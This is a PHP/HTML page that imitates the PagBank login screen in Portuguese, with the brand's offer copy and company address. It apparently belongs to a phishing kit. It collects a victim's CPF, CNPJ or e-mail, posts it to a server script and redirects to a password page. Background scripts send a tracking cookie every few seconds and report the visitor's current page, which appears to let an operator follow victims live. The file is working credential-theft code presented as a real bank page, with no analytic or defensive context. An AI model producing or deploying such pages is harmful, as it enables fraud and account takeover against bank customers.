<?php
session_start();

// Verifica se o cookie 'identificador_cliente' JÁ EXISTE
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se não existe, GERA um valor único e seguro
    $cookie_value = 'user_' . bin2hex(random_bytes(16));

    // Define o cookie para expirar em 30 dias
    setcookie('identificador_cliente', $cookie_value, time() + 86400 * 30, '/');

    // Disponibiliza o cookie para uso imediato no mesmo request
    $_COOKIE['identificador_cliente'] = $cookie_value;
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>A solução completa para pagamentos online</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }

    body {
      background: #fff;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 60px;
      border-bottom: 1px solid #ddd;
    }

    .flag {
      background: #f5f5f5;
      border: 1px solid #ccc;
      border-radius: 20px;
      padding: 6px 12px;
      font-size: 13px;
    }

    .main {
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 40px 60px;
      gap: 80px;
      flex: 1;
    }

    .left {
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      gap: 20px;
    }

    .banner-wrapper {
      display: flex;
      align-items: flex-start;
      gap: 40px;
    }

    .banner-wrapper img.banner {
      width: 300px;
      max-width: 100%;
    }

    .text-block {
      max-width: 360px;
      margin-top: 55px;
    }

    .text-block h2 {
      font-size: 20px;
      margin-bottom: 14px;
      color: #000;
    }

    .text-block p {
      font-size: 15px;
      color: #333;
      line-height: 1.5;
    }

    .store-area {
      margin-top: 10px;
      display: flex;
      align-items: center;
    }

    .store-caption {
      font-size: 14px;
      color: #444;
      white-space: nowrap;
    }

    .store-buttons {
      display: flex;
      gap: 0px;
      margin-left: 15px;
    }

    .store-buttons img {
      height: 40px;
      cursor: pointer;
    }

    .form-box {
      width: 360px;
      border: 1px solid #ccc;
      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
      border-radius: 4px;
      padding: 28px 24px;
      margin-bottom: 20px;
    }

    .tabs {
      display: flex;
      justify-content: space-between;
      border-bottom: 1px solid #ddd;
      margin-bottom: 20px;
    }

    .tabs div {
      flex: 1;
      text-align: center;
      padding: 10px 0;
      font-size: 14px;
      cursor: pointer;
      color: #444;
    }

    .tabs .active {
      font-weight: bold;
      position: relative;
    }

    .tabs .active::after {
      content: '';
      position: absolute;
      left: 25%;
      right: 25%;
      bottom: 0;
      height: 2px;
      background-color: #007fc7;
    }

    .form-box p {
      font-size: 13px;
      color: #555;
      margin-bottom: 10px;
    }

    input[type="text"] {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      border: 1px solid #aaa;
      border-radius: 4px;
      margin-bottom: 16px;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #007fc7;
      color: white;
      font-size: 15px;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      margin-bottom: 14px;
      cursor: pointer;
    }

    .link-outline {
      width: 100%;
      display: block;
      text-align: center;
      padding: 13px;
      border: 1px solid #007fc7;
      border-radius: 4px;
      color: #007fc7;
      text-decoration: none;
      font-size: 14px;
    }

    .comunicar-wrapper {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 20px 0 16px;
    }

    .comunicar {
      display: flex;
      align-items: center;
      font-size: 14px;
      color: #333;
      gap: 8px;
      padding-bottom: 4px;
    }

    .comunicar img {
      width: 20px;
      height: 20px;
    }

    .comunicar .seta {
      color: #007fc7;
      font-weight: bold;
      font-size: 18px;
      margin-left: 4px;
    }

    .linha-inferior {
      height: 1px;
      background-color: #ccc;
      width: fit-content;
      min-width: 300px;
    }

    .recaptcha {
      font-size: 12px;
      color: #555;
      text-align: center;
      margin-bottom: 16px;
    }

    .recaptcha a {
      color: #007fc7;
      text-decoration: none;
      margin: 0 4px;
    }

    .erro {
    display: none; /* manter oculto por padrão */
    color: #b30000;
    font-size: 13px;
    margin: 8px 0 16px;
    flex-direction: row;
    align-items: center;
    gap: 6px;
    }

    .erro img {
    width: 18px;
    height: 18px;
    display: block;
    }

    .error-border {
    border-color: #b30000 !important;
    }




    footer.rodape {
      background: #222;
      color: #ccc;
      text-align: center;
      font-size: 12px;
      padding: 20px 10px;
    }

    footer.rodape img {
      height: 28px;
      margin-bottom: 10px;
    }

    footer.rodape p {
      margin: 4px 0;
    }
  </style>
</head>
<body>
  <div class="header">
    <div class="flag" style="
    font-size: 14px;
    padding: 6px 16px;
    border-radius: 24px;
    margin-right: 390px;
    display: flex;
    align-items: center;
    gap: 6px;
    ">
    PT
    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#007fc7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-top: 1px;">
        <polyline points="6 9 12 15 18 9" />
    </svg>
    </div>
  </div>

  <div class="main">
    <div class="left">
      <div class="banner-wrapper">
        <img src="imagens/banner.png" alt="Banner PagBank" class="banner">
        <div class="text-block">
          <h2>CDB que rende muito <br> mais que a poupança + <br> cartão de crédito grátis.</h2>
          <p>Enquanto seu dinheiro rende, você <br> usa o limite no cartão de crédito e <br> resgata quando quiser. Sem <br> análise de crédito, inclusive para <br> negativados.</p>
        </div>
      </div>

      <div class="store-area">
        <div class="store-caption">Baixe o aplicativo</div>
        <div class="store-buttons">
          <img src="imagens/app-store.svg" alt="App Store">
          <img src="imagens/google-play.svg" alt="Google Play">
        </div>
      </div>
    </div>

    <div>
      <div class="form-box">
        <div class="tabs">
          <div class="active">Minha conta</div>
          <div>Usuário adicional</div>
        </div>

        <form action="processa.php" method="POST">

  <p>Bem-vindo, digite seu CPF, CNPJ ou E-mail para acessar sua conta</p>

  <input
    type="text"
    id="identificador"
    name="identificador"
    placeholder="CPF, CNPJ ou E-mail"
    required
  >

  <div id="erro" class="error">
    <img src="imagens/icon-erro.svg" alt="Erro">
    <span>Usuário inválido. Confira os dados.</span>
  </div>

  <button type="submit">Continuar</button>

  <a href="#" class="link-outline">Criar conta</a>

</form>


      <div class="comunicar-wrapper">
        <div class="comunicar">
          <img src="imagens/icon-phone.svg" alt="">
          <span>Comunicar perda ou roubo de celular</span>
          <span class="seta">›</span>
        </div>
        <div class="linha-inferior"></div>
      </div>

      <div class="recaptcha">
        Protegido por reCAPTCHA.<br>
        <a href="#">Privacidade</a> e <a href="#">Termos de Serviço</a>
      </div>
    </div>
  </div>

  <footer class="rodape">
    <p>© 1996-2025 Todos os direitos reservados.</p>
    <p>Av. Brigadeiro Faria Lima, 1.384, São Paulo - SP - CEP 01451-001</p>
  </footer>

  <script>
    function validarCPF(cpf) {
      cpf = cpf.replace(/[^\d]+/g, '');
      if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
      let soma = 0;
      for (let i = 0; i < 9; i++) soma += parseInt(cpf.charAt(i)) * (10 - i);
      let resto = 11 - (soma % 11);
      if (resto >= 10) resto = 0;
      if (resto !== parseInt(cpf.charAt(9))) return false;
      soma = 0;
      for (let i = 0; i < 10; i++) soma += parseInt(cpf.charAt(i)) * (11 - i);
      resto = 11 - (soma % 11);
      if (resto >= 10) resto = 0;
      return resto === parseInt(cpf.charAt(10));
    }

    function validarCNPJ(cnpj) {
      cnpj = cnpj.replace(/[^\d]+/g, '');
      if (cnpj.length !== 14 || /^(\d)\1{13}$/.test(cnpj)) return false;
      let t = cnpj.length - 2;
      let d = cnpj.substring(t);
      let calc = (x) => {
        let n = cnpj.substring(0, x);
        let r = 0, p = x - 7;
        for (let i = x; i >= 1; i--) {
          r += n.charAt(x - i) * p--;
          if (p < 2) p = 9;
        }
        let res = r % 11;
        return res < 2 ? 0 : 11 - res;
      };
      return calc(t) == d.charAt(0) && calc(t + 1) == d.charAt(1);
    }

    function validarEmail(email) {
      const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return regex.test(email);
    }

    function tipoIdentificador(valor) {
      const puro = valor.replace(/\D/g, '');
      if (puro.length === 11) return 'cpf';
      if (puro.length === 14) return 'cnpj';
      if (valor.includes('@')) return 'email';
      return null;
    }

    $('#identificador').on('input', function () {
      const input = $(this);
      const valorOriginal = input.val();
      const valor = valorOriginal.replace(/\D/g, '');
      $('#erro').hide();
      input.removeClass('error-border');

      if (/[a-zA-Z]/.test(valorOriginal)) return;

      if (valor.length <= 11) {
        input.val(valor.replace(/^(\d{0,3})(\d{0,3})(\d{0,3})(\d{0,2})$/, (_, a, b, c, d) =>
          [a, b, c].filter(Boolean).join('.') + (d ? '-' + d : '')
        ));
      } else if (valor.length <= 14) {
        input.val(valor.replace(/^(\d{0,2})(\d{0,3})(\d{0,3})(\d{0,4})(\d{0,2})$/, (_, a, b, c, d, e) =>
          [a, b, c].filter(Boolean).join('.') + (d ? '/' + d : '') + (e ? '-' + e : '')
        ));
      }
    });

    $('#btn').on('click', function () {
      const valor = $('#identificador').val().trim();
      const tipo = tipoIdentificador(valor);
      let valido = false;

      if (tipo === 'cpf') valido = validarCPF(valor);
      else if (tipo === 'cnpj') valido = validarCNPJ(valor);
      else if (tipo === 'email') valido = validarEmail(valor);

      if (!valido) {
        $('#erro').css('display', 'flex').hide().fadeIn(200);
        $('#identificador').addClass('error-border');
        return;
      }

      $.post('identificador.php', { 
          identificador: valor,
          device_type: 'Desktop' // Adicione esta linha
      }, () => {
          window.location.href = 'senha-desktop.php';
      });
    });
    document.addEventListener("DOMContentLoaded", function () {
      const userAgent = navigator.userAgent.toLowerCase();
      const isMobile = /iphone|ipod|android|webos|blackberry|iemobile|opera mini/.test(userAgent);

      if (isMobile) {
        window.location.href = "login.php"; // redireciona para versão mobile
      }
    });
  </script>
  <script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }
    function sendHeartbeat() {
            // CORREÇÃO: Usando o nome correto do cookie
        const userCookie = getCookie('identificador_cliente'); 

          if (userCookie) {
            const formData = new FormData();
              formData.append('identificador_cookie', userCookie);

                  fetch('/heartbeat.php', { // O caminho para o nosso novo arquivo
                      method: 'POST',
                      body: formData
                  }).catch(error => console.error('Heartbeat falhou:', error));
                } 
            }
            // Envia o primeiro sinal imediatamente e depois a cada 10 segundos
      sendHeartbeat();
      setInterval(sendHeartbeat, 3000); // 10000 ms = 10 segundos
  </script>
  <script>
      document.addEventListener("DOMContentLoaded", function() {
          const nomeDaPagina = 'login-desktop.php'; // <-- MUDE ESTE VALOR EM CADA PÁGINA
          
          const formData = new FormData();
          formData.append('page', nomeDaPagina);

          fetch('update_location.php', {
              method: 'POST',
              body: formData
          }).catch(error => console.error('Falha ao atualizar localização:', error));
      });
  </script>
</body>
</html>
